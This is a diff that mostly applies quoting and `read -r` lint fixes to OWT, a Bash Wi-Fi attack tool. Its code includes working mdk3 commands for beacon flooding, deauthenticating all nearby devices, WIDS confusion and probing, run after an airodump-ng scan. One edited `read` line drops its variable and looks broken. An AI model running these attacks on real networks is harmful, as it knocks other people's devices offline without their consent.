@@ -20,7 +20,7 @@ mon=Monitor
 man=Managed
 version="1.0.0"
 language="English"
-user="clu3bot"
+#user="clu3bot"
 github="https://github.com/clu3bot/"
 filename="OWT"
 creator="Brennan Mccown (clu3bot)"
@@ -36,8 +36,8 @@ ewr() {
 check_for_updates () {
 
 ewr "${YELLOW}Check for updates to owt tool${NONE}"
-read -p "Press Enter to Continue.."
-while [ `git stash --include-untracked | git reset --hard | git pull https://github.com/clu3bot/owt.git > git.txt` ]; do
+read -r -p "Press Enter to Continue.."
+while [ "$(git stash --include-untracked | git reset --hard | git pull https://github.com/clu3bot/owt.git > git.txt)" ]; do
 ewr "${NONE}[${LRED}Checking for updates to owt tool${NONE}]"
 ewr "\n${LBLUE}Please wait..${NONE}"
 done;
@@ -82,7 +82,7 @@ echo -e "${LBLUE}                 Version ${version}${NONE}"
 echo -e "${YELLOW}\n                     ...${NONE} "
 sleep 1.5
 clear
-check_for_connect
+#check_for_connect
 }
 
 #calls intro 1
@@ -118,13 +118,13 @@ perm="User is not root"
 fi
 ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}"
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 ewr "[${LRED}Interface${NONE}] ${LBLUE}${iface}${NONE}"
 dn=$(lsb_release -is)
 ewr "[${LRED}Distribution${NONE}] ${LBLUE}${dn}${NONE}"
 ewr "${LGREEN}*********************************************${NONE}"
 ewr "${LBLUE}Check if all necessary packages are installed${NONE}"
-read -p "Press Enter to Continue.."
+read -r -p "Press Enter to Continue.."
 }
 
 
@@ -159,11 +159,11 @@ check_dependencies () {
 permissions_prompt
 dependencies=(aircrack-ng mdk3)
 for d in "${dependencies[*]}"; do
-if [ $(dpkg-query -W -f='${Status}' $d 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
+if [ "$(dpkg-query -W -f='${Status}' "$d" 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
 	echo -e "${LBLUE}The following packages must be installed for the script to run...\n${LRED}${d}\n${LBLUE}Would you like to install them now? (Y/N)"
-read -p  r
+read -r -p 
 if [[ "$r" == ["yY"]* ]]; then
-	sudo apt-get install $d;
+	sudo apt-get install "$d";
 fi
 fi
 done
@@ -182,13 +182,23 @@ clear
 echo -e "${LGREEN}Putting Device in Managed Mode${NONE}"
 }
 
+mode_vars() {
+iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
+mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+if [ "$mode" ==  "Monitor" ]; then
+Mod=Monitor
+else
+Mod=Managed
+fi
+}
+
 #checks if device is in monitor mode if not prompts the user to put device in monitor mode
 check_monitor_mode () {
 clear
 echo -e "${LRED}All Packages have been installed successfully${NONE}"
 echo -e "${LGREEN}*********************************************${NONE}"
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -203,9 +213,9 @@ else
 fi
 if [[ "$re" == ["yY"]* ]]; then
         ecmonm &
-	ifconfig $iface up
+	ifconfig "$iface" up
 	sleep 0.1
-	airmon-ng start $iface
+	airmon-ng start "$iface"
 fi
 }
 #calls check monitor mode
@@ -217,7 +227,7 @@ monitor_mode () {
 ecmonm
 airmon-ng check kill
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -229,7 +239,7 @@ echo -e "${LRED}Device already in $mon mode ${NONE}"
 sleep 0.5
 main_menu
 else
-sudo airmon-ng start $iface
+sudo airmon-ng start "$iface"
 clear
 echo -e "${LRED}Device now in $mon Mode${NONE}"
 main_menu
@@ -241,7 +251,7 @@ managed_mode () {
 ecmanm &
 service network-manager start
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Managed" ]; then
 Mod=Managed
 else
@@ -253,7 +263,7 @@ echo -e "${LRED}Device already in $man mode ${NONE}"
 sleep 0.5
 main_menu
 else
-sudo airmon-ng stop $iface
+sudo airmon-ng stop "$iface"
 fi
 clear
 echo -e "${LRED}Device now in $man Mode${NONE}"
@@ -264,7 +274,7 @@ main_menu
 scan_networks () {
 clear
         iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-        mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+        mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
         Mod=Monitor
 else
@@ -274,25 +284,25 @@ if [ "$Mod" == "Monitor" ]; then
         sleep 0.1
 else
         echo -e "${LRED}This tool requires Monitor Mode${NONE}"
-        read -p "Press Enter to continue to Main Menu"
+        read -r -p "Press Enter to continue to Main Menu"
                 main_menu
 fi
         echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
 
-                trap "airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
-                xterm -e airodump-ng --output-format csv -w otp $iface > /dev/null & sleep 10 ; kill $!
+                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
+                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
         sed -i '1d' otp-01.csv
 kill %1
         echo -e "\n\n${LRED}Scan Results${NONE}"
         cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
-                while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do
+                while [ ${S} -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ ${S} -lt 1 ]; do
         echo -e "\n${LBLUE}Select a Network"
-        read -p "$(tput setaf 7) " S
+        read -r -p "$(tput setaf 7) " S
 done
-                nn=`sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 `
+                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
         rm -rf otp-01.csv 2> /dev/null
         echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
-        read -p "$(tput setaf 7)Press Enter to Continue.."
+        read -r -p "$(tput setaf 7)Press Enter to Continue.."
 clear
         main_menu
 }
@@ -317,7 +327,8 @@ clear
 #wifi attacks menu
 wifi_attacks_menu () {
 clear
-checkMode1
+mode_vars
+check_mode
 	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
 	ewr "${LGREEN}*****************${NONE}"
 	ewr "[${LBLUE}General${NONE}]"
@@ -331,27 +342,27 @@ checkMode1
 	ewr "${LGREEN}*****************${NONE}"
 while true; do
 echo -e "${LRED}Select an option:${NONE}"
-read -p "$(tput setaf 7)" option
+read -r -p "$(tput setaf 7)" option
 case $option in  
 
   0) echo -e "\n${NONE}${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      main_menu
      ;;
   1) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
-     read -p  "Are you sure? Press Enter.."
+     read -r -p  "Are you sure? Press Enter.."
      beacon_flood_attack
      ;;
   2) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      deauth_attack
      ;;
   3) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      probe_attack
      ;;
   4) echo -e "\n${YELLOW}Selected${NONE}${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      confusion_attack
      ;;
   *) echo -e "Not an Option"
@@ -373,7 +384,7 @@ sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets${NONE}"
 sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
-mdk3 $iface b -s 250
+mdk3 "$iface" b -s 250
 }
 
 #airplay deauth attack using mdk3
@@ -388,7 +399,7 @@ sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
 sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
-mdk3 $iface d -c
+mdk3 "$iface" d -c
 }
 
 #wids/wips confusion attack using mdk3
@@ -404,7 +415,7 @@ sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
 sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}WIDS/WIPS Confusion Commencing.."
-mdk3 $iface w -c -z -t $nn
+mdk3 "$iface" w -c -z -t "$nn"
 }
 
 #probe using mdk3
@@ -420,13 +431,13 @@ sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
 sleep 1
 echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
-mdk3 $iface p -e $nn
+mdk3 "$iface" p -e "$nn"
 }
 
 #checks if interface is in monitor mode for variable assignment
 check_mode_for_vars () {
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -437,7 +448,7 @@ fi
 #checks if interface is in monitor or managed mode /// for tools that require monitor
 check_mode () {
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -447,7 +458,7 @@ if [ "$Mod" == "Monitor" ]; then
 sleep 0.1
 else
 echo -e "${LRED}This tool requires $mon Mode${NONE}"
-read -p "Press Enter to continue to Main Menu"
+read -r -p "Press Enter to continue to Main Menu"
 main_menu
 fi
 }
@@ -476,7 +487,7 @@ fi
 scan_network_networkname () {
 clear
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
         Mod=Monitor
 else
@@ -486,25 +497,25 @@ if [ "$Mod" == "Monitor" ]; then
         sleep 0.1
 else
         echo -e "${LRED}This tool requires Monitor Mode${NONE}"
-        read -p "Press Enter to continue to Main Menu"
+        read -r -p "Press Enter to continue to Main Menu"
                 main_menu
 fi
         echo -e "${NONE}[${LRED}Scaning for Networks${NONE}]"
         
-                trap "airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null" EXIT
-                xterm -e airodump-ng --output-format csv -w otp $iface > /dev/null & sleep 10 ; kill $!
+                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
+                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
         sed -i '1d' otp-01.csv
 kill %1
         echo -e "\n\n${LRED}Scan Results${NONE}"
         cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
-                while [ ${S} -gt `wc -l otp-01.csv | cut -d " " -f 1` ] || [ ${S} -lt 1 ]; do 
+                while [ "${S}" -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ "${S}" -lt 1 ]; do 
         echo -e "\n${LBLUE}Select a Network"
-        read -p "$(tput setaf 7) " S
+        read -r -p "$(tput setaf 7) " S
 done
                 nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
         rm -rf otp-01.csv 2> /dev/null
         echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
-        read -p "$(tput setaf 7)Press Enter to Continue.."
+        read -r -p "$(tput setaf 7)Press Enter to Continue.."
 clear
 }
 
@@ -512,7 +523,7 @@ clear
 
 termination () {
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -530,7 +541,7 @@ exit
 else
 service network-manager start
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Managed" ]; then
 Mod=Managed
 else
@@ -542,7 +553,7 @@ clear
 sleep 0.5
 main_menu
 else
-sudo airmon-ng stop $iface
+sudo airmon-ng stop "$iface"
 fi
 clear
 exit
@@ -556,7 +567,7 @@ trap termination EXIT
 main_menu () {
 clear
 iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
-mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
+mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
 if [ "$mode" ==  "Monitor" ]; then
 Mod=Monitor
 else
@@ -580,36 +591,36 @@ fi
 	ewr "${LGREEN}*****************${NONE}"
 while true; do
 ewr "\n${LRED}Select an option:${NONE}"
-read -p "$(tput setaf 7)" option
+read -r -p "$(tput setaf 7)" option
 case $option in  
 
   0) echo -e "\n${NONE}${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
 	clear
      exit 0
      ;;
   1) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p  "Are you sure? Press Enter.."
+     read -r -p  "Are you sure? Press Enter.."
      main_menu
      ;;
   2) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      monitor_mode
      ;;
   3) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      managed_mode
      ;;
   4) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      scan_networks
      ;;
   5) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      wifi_attacks_menu
      ;;
   6) echo -e "\n${YELLOW}Selected${NONE} [${YELLOW}$option${NONE}]"
-     read -p "Are you sure? Press Enter.."
+     read -r -p "Are you sure? Press Enter.."
      about_page
      ;;
   *) echo -e "Not an Option"
@@ -650,4 +661,5 @@ termination
 }
 
 OWT
+
 
